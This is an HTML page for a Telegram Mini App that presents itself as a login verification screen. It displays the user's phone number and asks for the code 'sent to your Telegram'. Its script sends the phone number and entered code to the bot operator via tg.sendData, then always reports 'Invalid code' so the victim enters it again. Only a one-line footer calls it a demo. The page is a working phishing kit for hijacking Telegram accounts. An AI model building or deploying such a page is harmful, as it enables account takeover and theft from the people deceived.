<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Login</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
            background: #0f0f0f;
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            min-height: 100vh;
            padding: 20px;
            color: white;
            background-image: url('https://raw.githubusercontent.com/ps1677169-commits/Gift/refs/heads/main/photo-1515161318750-781d6122e367.jpeg');
            background-size: cover;
            background-position: center;
            background-repeat: no-repeat;
        }
        body::before {
            content: '';
            position: fixed;
            top: 0; left: 0; right: 0; bottom: 0;
            background: rgba(0,0,0,0.6);
            z-index: 0;
        }
        .container {
            position: relative;
            z-index: 1;
            background: rgba(0,0,0,0.85);
            padding: 30px 25px;
            border-radius: 20px;
            width: 100%;
            max-width: 400px;
            backdrop-filter: blur(10px);
            box-shadow: 0 8px 32px rgba(0,0,0,0.8);
        }
        h1 {
            text-align: center;
            font-size: 24px;
            font-weight: 600;
            margin-bottom: 10px;
            color: #fff;
        }
        .phone-display {
            background: #1e1e1e;
            padding: 15px;
            border-radius: 12px;
            text-align: center;
            font-size: 22px;
            font-weight: 500;
            color: #e0e0e0;
            margin-bottom: 25px;
            letter-spacing: 1px;
            border: 1px solid #333;
        }
        .code-display {
            background: #1e1e1e;
            padding: 12px;
            border-radius: 12px;
            text-align: center;
            font-size: 28px;
            font-weight: 600;
            letter-spacing: 8px;
            color: #fff;
            margin-bottom: 30px;
            min-height: 60px;
            border: 1px solid #555;
        }
        .keypad {
            display: grid;
            grid-template-columns: repeat(3, 1fr);
            gap: 12px;
            margin-bottom: 20px;
        }
        .key {
            background: #2a2a2a;
            border: none;
            color: white;
            font-size: 26px;
            font-weight: 500;
            padding: 16px 0;
            border-radius: 16px;
            cursor: pointer;
            transition: background 0.15s;
            box-shadow: 0 2px 8px rgba(0,0,0,0.4);
        }
        .key:active { background: #4a4a4a; }
        .key.back {
            background: #3a1a1a;
            font-size: 20px;
        }
        .key.back:active { background: #5a2a2a; }
        .key:not(.back):not(.send) {
            background: #1a3a5a;
            border: 1px solid #4a8aba;
        }
        .key:not(.back):not(.send):active {
            background: #2a5a7a;
        }
        .send-btn {
            background: #3390ec;
            border: none;
            color: white;
            font-size: 20px;
            font-weight: 600;
            padding: 16px;
            border-radius: 16px;
            width: 100%;
            cursor: pointer;
            transition: background 0.15s;
            box-shadow: 0 4px 12px rgba(51,144,236,0.4);
        }
        .send-btn:active { background: #2676c4; }
        .send-btn:disabled {
            opacity: 0.5;
            pointer-events: none;
        }
        .status {
            text-align: center;
            margin-top: 12px;
            font-size: 14px;
            color: #aaa;
            min-height: 24px;
        }
        .footer {
            text-align: center;
            margin-top: 15px;
            font-size: 12px;
            color: #666;
        }
    </style>
</head>
<body>
    <div class="container">
        <h1>🔐 Verification</h1>
        <div class="phone-display" id="phoneDisplay">Loading number...</div>
        <div class="code-display" id="codeDisplay">——</div>
        <div class="keypad" id="keypad"></div>
        <button class="send-btn" id="sendBtn">Confirm Code</button>
        <div class="status" id="statusMsg">Enter the code sent to your Telegram</div>
        <div class="footer">This is a demo — do not use maliciously</div>
    </div>

    <script src="https://telegram.org/js/telegram-web-app.js"></script>
    <script>
        (function() {
            const tg = window.Telegram.WebApp;
            tg.expand();
            let phone = tg.initDataUnsafe?.user?.phone_number || 'No phone number';
            document.getElementById('phoneDisplay').textContent = phone;

            let code = '';
            const maxCodeLength = 6;
            const codeDisplay = document.getElementById('codeDisplay');
            const statusMsg = document.getElementById('statusMsg');

            const keypad = document.getElementById('keypad');
            const layout = [
                ['1','2','3'],
                ['4','5','6'],
                ['7','8','9'],
                ['back','0','send']
            ];
            layout.forEach(row => {
                row.forEach(k => {
                    const btn = document.createElement('button');
                    btn.className = 'key';
                    if (k === 'back') { btn.classList.add('back'); btn.textContent = '⌫'; }
                    else if (k === 'send') { btn.classList.add('send'); btn.textContent = '✓'; }
                    else { btn.textContent = k; }
                    btn.dataset.value = k;
                    btn.addEventListener('click', handleKey);
                    keypad.appendChild(btn);
                });
            });

            function handleKey(e) {
                const val = e.currentTarget.dataset.value;
                if (val === 'back') {
                    code = code.slice(0, -1);
                } else if (val === 'send') {
                    document.getElementById('sendBtn').click();
                    return;
                } else {
                    if (code.length < maxCodeLength) {
                        code += val;
                    } else {
                        statusMsg.textContent = '❌ Code too long (max '+maxCodeLength+')';
                        return;
                    }
                }
                updateDisplay();
                statusMsg.textContent = 'Entering code...';
            }

            function updateDisplay() {
                const display = code.padEnd(maxCodeLength, '—');
                codeDisplay.textContent = display;
            }

            document.getElementById('sendBtn').addEventListener('click', function() {
                if (code.length < 5) {
                    statusMsg.textContent = '❌ Please enter the full code (5-6 digits)';
                    return;
                }
                const data = { phone: phone, code: code };
                tg.sendData(JSON.stringify(data));
                statusMsg.textContent = '⏳ Sending...';
                this.disabled = true;
                setTimeout(() => {
                    statusMsg.textContent = '❌ Invalid code. Please try again.';
                    this.disabled = false;
                    code = '';
                    updateDisplay();
                }, 2000);
            });

            updateDisplay();
        })();
    </script>
</body>
</html>
